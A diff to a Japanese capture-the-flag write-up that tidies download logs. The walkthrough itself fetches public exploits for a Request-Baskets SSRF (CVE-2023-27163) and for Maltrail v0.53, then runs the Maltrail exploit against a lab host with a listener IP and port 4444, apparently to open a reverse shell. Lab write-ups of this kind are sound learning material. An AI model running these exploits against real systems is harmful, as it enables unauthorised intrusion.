@@ -24,17 +24,8 @@ Nmap done: 1 IP address (1 host up) scanned in 1000 seconds
 [PoC](https://github.com/entr0pie/CVE-2023-27163/tree/main)では、ターゲットで内部向けのポートへフォワーディングできる  
 nmapの結果では80番がフィルタされていたのでPoCで確認してみる
 ```sh
-└─$ wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh  
---2025-06-30 09:12:20--  https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 1669 (1.6K) [text/plain]
-Saving to: ‘CVE-2023-27163.sh’
-
-CVE-2023-27163.sh                                          100%[========================================================================================================================================>]   1.63K  --.-KB/s    in 0s      
-
-2025-06-30 09:12:21 (24.1 MB/s) - ‘CVE-2023-27163.sh’ saved [1669/1669]
+└─$ wget -nv https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh  
+2025-06-30 09:12:21 URL:https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh [1669/1669] -> "CVE-2023-27163.sh" [1]
 
 └─$ chmod +x CVE-2023-27163.sh
 
@@ -85,17 +76,8 @@ Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at htt
 ./CVE-2023-27163.sh: line 43: jq: command not found
 > Response body (Authorization): {"token":"8fGpaB2m8QH7NW0ne_6Rxd-l0B8LHvFtRjMoVpTutd5r"}
 
-└─$ wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
---2025-07-02 02:09:48--  https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
-Proxy request sent, awaiting response... 200 OK
-Length: 2200 (2.1K) [text/plain]
-Saving to: ‘exploit.py’
-
-exploit.py                                                 100%[========================================================================================================================================>]   2.15K  --.-KB/s    in 0s      
-
-2025-07-02 02:09:49 (25.3 MB/s) - ‘exploit.py’ saved [2200/2200]
+└─$ wget -nv https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
+2025-07-02 02:09:49 URL:https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py [2200/2200] -> "exploit.py" [1]
 
 └─$ python3.13 exploit.py 10.10.16.4 4444 http://10.129.200.37:55555/tcrcqh
 Running exploit on http://10.129.200.37:55555/tcrcqh
